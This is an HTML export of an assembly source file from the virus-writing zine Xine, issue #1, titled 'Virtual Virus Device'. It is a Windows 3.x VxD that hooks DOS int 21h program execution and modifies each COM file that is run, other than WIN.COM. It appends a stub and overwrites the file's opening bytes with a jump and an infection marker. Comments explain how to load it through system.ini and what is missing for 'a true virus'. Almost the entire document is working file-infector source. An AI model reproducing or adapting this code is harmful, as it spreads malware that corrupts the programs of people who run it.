<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                         /-----------------------------\
;                                         | Xine - issue #1 - Phile 006 |</span><span class="sc0">
</span><span class="sc1">;                                         \-----------------------------/</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; JHB presents:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         infections by VxD</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Well yes just as tsr's are to dos as VxD's to windows  they offer an</span><span class="sc0">
</span><span class="sc1">; amazing power and most probaly 90 percent will never know a VxD has been</span><span class="sc0">
</span><span class="sc1">; added.  This example shows how a VxD can modify com files and do it fast.</span><span class="sc0">
</span><span class="sc1">; To make a true virus you would need to add a method to get the vxd in</span><span class="sc0">
</span><span class="sc1">; memory. Infecting a command file and hooking the int 2f you can watch</span><span class="sc0">
</span><span class="sc1">; and wait till windows yells out "hey Look out I am loading" at this time</span><span class="sc0">
</span><span class="sc1">; you can make the vxd tell windows to load it. Another I feel may be easier</span><span class="sc0">
</span><span class="sc1">; is to modifiy the system.ini to load it.  But those are otherbridges to</span><span class="sc0">
</span><span class="sc1">; cross... </span><span class="sc0">


</span><span class="sc1">;well lets be honest I use a source code as a frame to build this</span><span class="sc0">
</span><span class="sc1">;example, I did make the int 21 hook and the other stuff but thats</span><span class="sc0">
</span><span class="sc1">;just modified virus ideas from regular dos virii.</span><span class="sc0">
</span><span class="sc1">;to test just ad the line in the system.ini in the</span><span class="sc0">
</span><span class="sc1">;[386Enh]</span><span class="sc0">
</span><span class="sc1">;device=vvmd.386</span><span class="sc0">
</span><span class="sc1">;oh yea you need the masm5.1 and the device driver kit for windows3.X</span><span class="sc0">
</span><span class="sc1">;to assembly this if any one finds another way to assembly this please</span><span class="sc0">
</span><span class="sc1">;let me know.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;************************************************************************</span><span class="sc0">
</span><span class="sc9">TITLE</span><span class="sc0"> </span><span class="sc5">VVD.ASM</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Virtual</span><span class="sc0"> </span><span class="sc5">Virus</span><span class="sc0"> </span><span class="sc5">Device</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;problem if ifshlp is loaded in the config.sys windows</span><span class="sc0">
</span><span class="sc1">;refuse to loads no error just returns to the c:\   only happen on one</span><span class="sc0">
</span><span class="sc1">;system not sure why</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;************************************************************************</span><span class="sc0">

        </span><span class="sc2">.386p</span><span class="sc0">


</span><span class="sc1">;************************************************************************</span><span class="sc0">
</span><span class="sc1">;                             I N C L U D E S</span><span class="sc0">
</span><span class="sc1">;************************************************************************</span><span class="sc0">

        </span><span class="sc9">.XLIST</span><span class="sc0">
        </span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">VMM.Inc</span><span class="sc0">
        </span><span class="sc9">.LIST</span><span class="sc0">

</span><span class="sc1">;************************************************************************</span><span class="sc0">
</span><span class="sc1">;                V I R T U A L   D E V I C E   D E C L A R A T I O N</span><span class="sc0">
</span><span class="sc1">;************************************************************************</span><span class="sc0">

</span><span class="sc5">Declare_Virtual_Device</span><span class="sc0"> </span><span class="sc5">VVD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VVD_Control</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">TSRLoad_Device_ID</span><span class="sc4">,</span><span class="sc0"> \
                       </span><span class="sc5">Undefined_Init_Order</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">


</span><span class="sc1">;************************************************************************</span><span class="sc0">
</span><span class="sc1">;                  I N I T I A L I Z A T I O N   D A T A</span><span class="sc0">
</span><span class="sc1">;************************************************************************</span><span class="sc0">

</span><span class="sc5">VxD_DATA_SEG</span><span class="sc0">

</span><span class="sc5">pFn</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">VVD_RW_BUFF</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">32h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">SysFile</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"WIN.COM"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">9</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">SysFileLen</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">hFILE</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">NEW_JMP</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E9H</span><span class="sc0">
</span><span class="sc5">Fsize</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">MARKER</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"V"</span><span class="sc0">

</span><span class="sc5">V_HOST</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">          </span><span class="sc1">;MOV WORD PTR [100],</span><span class="sc0">
</span><span class="sc5">FIRST_WORD</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0C7H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">          </span><span class="sc1">;MOV WORD PTR [102],</span><span class="sc0">
</span><span class="sc5">SECOND_WORD</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">068H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">              </span><span class="sc1">;PUSH 0100</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0C3H</span><span class="sc0">                      </span><span class="sc1">;RET</span><span class="sc0">
</span><span class="sc5">SIZE_V</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0010H</span><span class="sc0">
</span><span class="sc5">VxD_DATA_ENDS</span><span class="sc0">

</span><span class="sc1">;************************************************************************</span><span class="sc0">
</span><span class="sc1">;             R E A L   M O D E   I N I T I A L I Z A T I O N</span><span class="sc0">
</span><span class="sc1">;************************************************************************</span><span class="sc0">

</span><span class="sc5">VxD_REAL_INIT_SEG</span><span class="sc0">

</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">VVD_Real_Mode_Init</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">;nothing to do here</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                  </span><span class="sc1">;except tell windows that</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Device_Load_Ok</span><span class="sc0">      </span><span class="sc1">;everything's ok</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">VVD_Real_Mode_Init</span><span class="sc0">

</span><span class="sc5">VxD_REAL_INIT_ENDS</span><span class="sc0">

</span><span class="sc1">;*************************************************************************</span><span class="sc0">
</span><span class="sc1">;              D E V I C E   C O N T R O L   P R O C E D U R E</span><span class="sc0">
</span><span class="sc1">;*************************************************************************</span><span class="sc0">

</span><span class="sc5">VxD_CODE_SEG</span><span class="sc0">

</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">VVD_Control</span><span class="sc0">

        </span><span class="sc5">Control_Dispatch</span><span class="sc0"> </span><span class="sc5">Device_Init</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VVD_Device_Init</span><span class="sc0">
        </span><span class="sc5">Control_Dispatch</span><span class="sc0"> </span><span class="sc5">Init_Complete</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VVD_Init_Complete</span><span class="sc0">

        </span><span class="sc6">clc</span><span class="sc0">                          </span><span class="sc1">; Ignore other control calls</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">VVD_Control</span><span class="sc0">

</span><span class="sc5">VxD_CODE_ENDS</span><span class="sc0">


</span><span class="sc1">;*************************************************************************</span><span class="sc0">
</span><span class="sc1">;                   I N I T I A L I Z A T I O N   C O D E</span><span class="sc0">
</span><span class="sc1">;*************************************************************************</span><span class="sc0">

</span><span class="sc5">VxD_ICODE_SEG</span><span class="sc0">

</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">VVD_Device_Init</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">21H</span><span class="sc0">                 </span><span class="sc1">;hook V86 int 21 handler</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">int_21handler</span><span class="sc0">
        </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">Hook_V86_Int_Chain</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">                             </span><span class="sc1">;say everything's clear</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">VVD_Device_Init</span><span class="sc0">

</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">VVD_Init_Complete</span><span class="sc0">

        </span><span class="sc6">clc</span><span class="sc0">                             </span><span class="sc1">;say everything's clear</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">VVD_Init_Complete</span><span class="sc0">

</span><span class="sc5">VxD_ICODE_ENDS</span><span class="sc0">

</span><span class="sc5">VxD_CODE_SEG</span><span class="sc0">

</span><span class="sc1">;*************************************************************************</span><span class="sc0">
</span><span class="sc1">;                   V86 I N T E R R U P T   H A N D L E R S</span><span class="sc0">
</span><span class="sc1">;*************************************************************************</span><span class="sc0">

</span><span class="sc1">;*************************************************************************</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   int_21handler</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   DESCRIPTON: aTTEMPTS TO DETERMINE IF THE FILE IS A COM FILE IF SO</span><span class="sc0">
</span><span class="sc1">;               ADD SOME MARKER AT THE END</span><span class="sc0">
</span><span class="sc1">;               pass that point the com file is modified to</span><span class="sc0">
</span><span class="sc1">;               jmp to the end then return after restoring the host</span><span class="sc0">
</span><span class="sc1">;               </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;=========================================================================</span><span class="sc0">
</span><span class="sc1">;NOTE IT APPEARS THAT ON ENTRY TO HERE EBP -&gt; TO THE CRS (REGS STRUCTURE)</span><span class="sc0">
</span><span class="sc1">;WHILE                                 EBX -&gt; THE VM HANDLE</span><span class="sc0">
</span><span class="sc1">;NOTE SURE IF THE EBX IS A POINTER BUT i AM ASSUMING IT IS AT THIS TIME</span><span class="sc0">
</span><span class="sc1">;TO MAKE LIFE EASIER</span><span class="sc0">
</span><span class="sc1">;SEEMS MY GUESS IS WRONG</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The system calls the procedure as follows:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    mov     eax, Interrupt      ; number of interrupt hooked</span><span class="sc0">
</span><span class="sc1">;    mov     ebx, VM             ; current VM handle</span><span class="sc0">
</span><span class="sc1">;    mov     ebp, OFFSET32 crs   ; points to a Client_Reg_Struc</span><span class="sc0">
</span><span class="sc1">;    call    [HookProc]</span><span class="sc0">



</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">int_21handler</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ebp.Client_AX</span><span class="sc4">],</span><span class="sc2">4b00h</span><span class="sc0">            </span><span class="sc1">;the exec call</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">REFLECT_21</span><span class="sc0">


        </span><span class="sc5">Push_Client_State</span><span class="sc0">          </span><span class="sc1">;RESTORES THE CLIENT_IP_REG AND CS</span><span class="sc0">
        </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">Begin_Nest_Exec</span><span class="sc0">    </span><span class="sc1">;RESTORES THE CLIENT REGS  </span><span class="sc0">

    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.Client_DS</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; get offset to file name</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.Client_DX</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.CB_High_Linear</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">pFn</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc1">;  if win.com  do not infect</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                        </span><span class="sc1">; file name</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">                            
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">i21_90</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">i21_100</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'/'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">i21_100</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">':'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">i21_100</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">i21_100</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">i21_90</span><span class="sc0">

</span><span class="sc5">i21_100</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">; see if they match</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SysFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SysFileLen</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">repe</span><span class="sc0">    </span><span class="sc6">cmpsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">EXIT_I21</span><span class="sc0">                   </span><span class="sc1">; win.com do not play with</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D22h</span><span class="sc0">                 </span><span class="sc1">; open file</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">file_open</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">EXIT_I21</span><span class="sc0">                   </span><span class="sc1">;  error on open</span><span class="sc0">

</span><span class="sc5">file_open</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hFile</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">             </span><span class="sc1">;YEA OLD SAVE FILE  </span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">                         </span><span class="sc1">;HANDLE</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3F00h</span><span class="sc0">          </span><span class="sc1">; read MZ</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                          </span><span class="sc1">;assume if not MZ</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FIRST_WORD</span><span class="sc0">                </span><span class="sc1">;its a com file</span><span class="sc0">
        </span><span class="sc5">VxDint</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">EXIT_I21</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FIRST_WORD</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5A4Dh</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close_EXIT_I21</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3F00h</span><span class="sc0">                      </span><span class="sc1">; read next two bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                          </span><span class="sc1">;assume if not MZ</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SECOND_WORD</span><span class="sc0">                </span><span class="sc1">;its a com file</span><span class="sc0">
        </span><span class="sc5">VxDint</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">EXIT_I21</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SECOND_WORD</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc3">"V"</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close_EXIT_I21</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">



        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">                      </span><span class="sc1">; seek to end</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">close_EXIT_I21</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;FILE IS TOO BIG</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">close_EXIT_I21</span><span class="sc0">                  </span><span class="sc1">;GET OUT OF HERE</span><span class="sc0">

        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">                             </span><span class="sc1">;adjust the file size</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">                             </span><span class="sc1">;for the jmp</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">Fsize</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">;SAVE THE FILE_SIZE</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">4000H</span><span class="sc0">                       </span><span class="sc1">;WRITE THE V_HOST</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10H</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">V_HOST</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">VxDint</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">                      </span><span class="sc1">; seek to end</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">close_EXIT_I21</span><span class="sc0">


        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">4000H</span><span class="sc0">                       </span><span class="sc1">;WRITE THE  </span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                          </span><span class="sc1">;NEW JMP</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NEW_JMP</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">VxDint</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">close_EXIT_I21</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hFile</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; close file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3E00h</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">
        



</span><span class="sc5">EXIT_I21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">End_Nest_Exec</span><span class="sc0">      </span><span class="sc1">;RESTORES THE CLIENT_IP_REG AND CS</span><span class="sc0">
        </span><span class="sc5">Pop_Client_State</span><span class="sc0">           </span><span class="sc1">;RESTORES THE CLIENT REGS</span><span class="sc0">


                                                  

</span><span class="sc5">REFLECT_21</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc1">;reflect interrupt to next VxD or to V86 handler</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">int_21handler</span><span class="sc0">

